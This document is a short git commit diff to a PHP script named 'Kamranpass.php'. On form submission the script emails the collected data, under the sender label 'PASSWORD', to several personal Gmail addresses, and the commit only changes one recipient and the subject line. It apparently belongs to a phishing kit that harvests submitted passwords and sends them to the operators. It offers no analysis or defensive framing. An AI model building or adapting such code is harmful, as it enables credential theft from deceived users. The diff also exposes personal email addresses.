935e0e76b29b82e7e7b990a1132252fcd5436484
maxibooy <maxiibooy001@gmail.com>
2025-08-13 19:46:57 +0500

    Update Kamranpass.php

--- Kamranpass.php
+++ Kamranpass.php
@@ -36,13 +36,13 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // Email properties
         $mail->setFrom('rutherfordhenress@gmail.com', 'PASSWORD');
         $mail->addAddress('rutherfordhenress@gmail.com');
-        $mail->addAddress('Kamrannizamani434@gmail.com');
+        $mail->addAddress('jghu515@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'KAMRAN';
+        $mail->Subject = 'GULO';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
